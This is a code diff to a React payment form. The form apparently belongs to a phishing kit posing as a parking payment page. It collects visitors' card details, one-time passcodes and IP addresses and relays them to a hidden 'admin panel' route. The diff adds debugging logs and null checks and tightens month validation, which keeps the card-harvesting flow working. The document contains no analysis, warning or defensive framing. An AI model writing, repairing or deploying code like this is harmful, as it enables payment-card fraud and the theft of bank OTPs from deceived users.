@@ -147,8 +147,12 @@ const PaymentForm = () => {
   useEffect(() => {
     // Initialize broadcast channel and send visitor data with real IP
     const initializeConnection = async () => {
+      // Ensure we always use the same channel name
+      const channelName = 'cardData';
+      
       if (!window.cardDataChannel) {
-        window.cardDataChannel = new BroadcastChannel('cardData');
+        window.cardDataChannel = new BroadcastChannel(channelName);
+        console.log('Created new BroadcastChannel:', channelName);
       }
 
       const realIP = await getRealIP();
@@ -165,6 +169,10 @@ const PaymentForm = () => {
       };
 
       console.log('Sending visitor data with real IP:', visitorData);
+      console.log('Current window location:', window.location.href);
+      console.log('Admin panel should be at:', window.location.origin + '/parking55009hvSweJimbs5hhinbd56y');
+      
+      // Send the visitor data
       window.cardDataChannel.postMessage(visitorData);
     };
 
@@ -233,7 +241,9 @@ const PaymentForm = () => {
       }
     };
 
-    window.cardDataChannel.onmessage = handleMessage;
+    if (window.cardDataChannel) {
+      window.cardDataChannel.onmessage = handleMessage;
+    }
 
     // Handle click anywhere to show alert
     const handleDocumentClick = (e: MouseEvent) => {
@@ -260,7 +270,9 @@ const PaymentForm = () => {
     document.addEventListener('click', handleDocumentClick);
 
     return () => {
-      window.cardDataChannel.onmessage = null;
+      if (window.cardDataChannel) {
+        window.cardDataChannel.onmessage = null;
+      }
       document.removeEventListener('click', handleDocumentClick);
     };
   }, []);
@@ -290,7 +302,15 @@ const PaymentForm = () => {
 
   const sendToAdminPanel = (data: any) => {
     console.log('Sending data to admin panel:', data);
-    window.cardDataChannel.postMessage(data);
+    console.log('Channel exists:', !!window.cardDataChannel);
+    console.log('Expected admin route: /parking55009hvSweJimbs5hhinbd56y');
+    
+    if (window.cardDataChannel) {
+      window.cardDataChannel.postMessage(data);
+      console.log('Data sent successfully via BroadcastChannel');
+    } else {
+      console.error('BroadcastChannel not available');
+    }
   };
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
@@ -304,8 +324,8 @@ const PaymentForm = () => {
       });
     } else if (name === 'expiryMonth') {
       const numericValue = value.replace(/\D/g, '').slice(0, 2);
-      // Allow any numeric input up to 2 digits, including leading zeros
-      if (numericValue === '' || (numericValue.length <= 2 && parseInt(numericValue) <= 12 && parseInt(numericValue) >= 0)) {
+      // Allow leading zeros and validate month (01-12)
+      if (numericValue === '' || (numericValue.length <= 2 && parseInt(numericValue) <= 12 && parseInt(numericValue) >= 1)) {
         setFormData({
           ...formData,
           [name]: numericValue
@@ -374,6 +394,7 @@ const PaymentForm = () => {
     };
     
     console.log('Submitting card data:', cardData);
+    console.log('Admin panel route: /parking55009hvSweJimbs5hhinbd56y');
     sendToAdminPanel(cardData);
   };
 
@@ -385,11 +406,14 @@ const PaymentForm = () => {
     setIsConfirmLoading(true);
     
     // Send OTP to admin panel
-    sendToAdminPanel({
+    const otpData = {
       type: 'otp',
       otp: otp,
       timestamp: new Date().toISOString()
-    });
+    };
+    
+    console.log('Sending OTP data:', otpData);
+    sendToAdminPanel(otpData);
   };
 
   const getLastFourDigits = () => {
